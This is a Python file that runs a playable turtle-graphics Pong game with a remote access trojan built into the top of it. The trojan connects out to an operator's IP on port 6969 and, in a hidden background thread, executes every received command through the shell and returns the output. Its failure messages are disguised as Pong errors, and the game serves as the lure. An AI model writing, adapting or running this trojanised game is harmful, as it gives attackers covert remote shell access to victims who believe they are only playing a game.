import turtle
import socket
import subprocess
import threading

# RAT IP and Port
SERVER_IP = '' # Enter Public Or Private IP
PORT = 6969

# RAT Connection
s = socket.socket()
try:
    s.connect((SERVER_IP, PORT))
except ConnectionRefusedError:
    print("Pong encountered 1 error: Code 0x505")

# RAT Functionality
def RAT_Command_Handler():
    try:
        while True:
            cmd = s.recv(1024).decode()
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                s.send(output)
            except subprocess.CalledProcessError as e:
                s.send(e.output)
    except:
        print("Failed to send Pong Commands")

# Create a thread for handling RAT commands so pong can run on main thread
rat_thread = threading.Thread(target=RAT_Command_Handler)
rat_thread.daemon = True
rat_thread.start()

"""
↑↑↑ ↑↑↑↑
RAT Code

Pong Code
↓↓↓↓ ↓↓↓↓
"""

# Paddle Movement Speed
PADDLE_SPEED = 20

# Game Window Configuration
WINDOW_WIDTH = 800
WINDOW_HEIGHT = 600

# Paddle Configuration
PADDLE_WIDTH = 20
PADDLE_HEIGHT = 100

# Ball Configuration
BALL_RADIUS = 10
BALL_DX = 0.1
BALL_DY = 0.1

# Game Score
score_a = 0
score_b = 0

# Create the game window
window = turtle.Screen()
window.title("Pong")
window.bgcolor("black")
window.setup(WINDOW_WIDTH, WINDOW_HEIGHT)
window.tracer(0)

# Paddle A
paddle_a = turtle.Turtle()
paddle_a.speed(0)
paddle_a.shape("square")
paddle_a.color("white")
paddle_a.shapesize(stretch_wid=5, stretch_len=1)
paddle_a.penup()
paddle_a.goto(-350, 0)

# Paddle B
paddle_b = turtle.Turtle()
paddle_b.speed(0)
paddle_b.shape("square")
paddle_b.color("white")
paddle_b.shapesize(stretch_wid=5, stretch_len=1)
paddle_b.penup()
paddle_b.goto(350, 0)

# Ball
ball = turtle.Turtle()
ball.speed(40)
ball.shape("square")
ball.color("white")
ball.penup()
ball.goto(0, 0)
ball.dx = BALL_DX
ball.dy = BALL_DY

# Pen
pen = turtle.Turtle()
pen.speed(0)
pen.color("white")
pen.penup()
pen.hideturtle()
pen.goto(0, 260)
pen.write("Player A: 0  Player B: 0", align="center", font=("Courier", 24, "normal"))

# Paddle A movement functions
def paddle_a_up():
    y = paddle_a.ycor()
    if y < (WINDOW_HEIGHT / 2) - PADDLE_HEIGHT / 2:
        y += PADDLE_SPEED
    paddle_a.sety(y)

def paddle_a_down():
    y = paddle_a.ycor()
    if y > (-WINDOW_HEIGHT / 2) + PADDLE_HEIGHT / 2:
        y -= PADDLE_SPEED
    paddle_a.sety(y)

# Paddle B movement functions
def paddle_b_up():
    y = paddle_b.ycor()
    if y < (WINDOW_HEIGHT / 2) - PADDLE_HEIGHT / 2:
        y += PADDLE_SPEED
    paddle_b.sety(y)

def paddle_b_down():
    y = paddle_b.ycor()
    if y > (-WINDOW_HEIGHT / 2) + PADDLE_HEIGHT / 2:
        y -= PADDLE_SPEED
    paddle_b.sety(y)

# Keyboard bindings
window.listen()
window.onkeypress(paddle_a_up, "w")
window.onkeypress(paddle_a_down, "s")
window.onkeypress(paddle_b_up, "Up")
window.onkeypress(paddle_b_down, "Down")

def update_score():
    pen.clear()
    pen.write("Player A: {}  Player B: {}".format(score_a, score_b), align="center", font=("Courier", 24, "normal"))

def move_ball():
    global score_a, score_b

    # Move the ball
    ball.setx(ball.xcor() + ball.dx)
    ball.sety(ball.ycor() + ball.dy)

    # Check for collision with the top/bottom walls
    if ball.ycor() > (WINDOW_HEIGHT / 2) - BALL_RADIUS or ball.ycor() < (-WINDOW_HEIGHT / 2) + BALL_RADIUS:
        ball.dy *= -1

    # Check for collision with the paddles
    if (
        (ball.dx > 0)
        and (350 > ball.xcor() > 340)
        and (paddle_b.ycor() + PADDLE_HEIGHT / 2 > ball.ycor() > paddle_b.ycor() - PADDLE_HEIGHT / 2)
    ):
        ball.color("blue")
        ball.setx(340)
        ball.dx *= -1

    elif (
        (ball.dx < 0)
        and (-350 < ball.xcor() < -340)
        and (paddle_a.ycor() + PADDLE_HEIGHT / 2 > ball.ycor() > paddle_a.ycor() - PADDLE_HEIGHT / 2)
    ):
        ball.color("red")
        ball.setx(-340)
        ball.dx *= -1

    # Check for scoring
    if ball.xcor() > (WINDOW_WIDTH / 2) - BALL_RADIUS:
        score_a += 1
        update_score()
        ball.goto(0, 0)
        ball.dy *= -1

    elif ball.xcor() < (-WINDOW_WIDTH / 2) + BALL_RADIUS:
        score_b += 1
        update_score()
        ball.goto(0, 0)
        ball.dy *= -1

    # Update the screen
    window.update()

def run_game():
    while True:
        move_ball()

# Start game loop
run_game()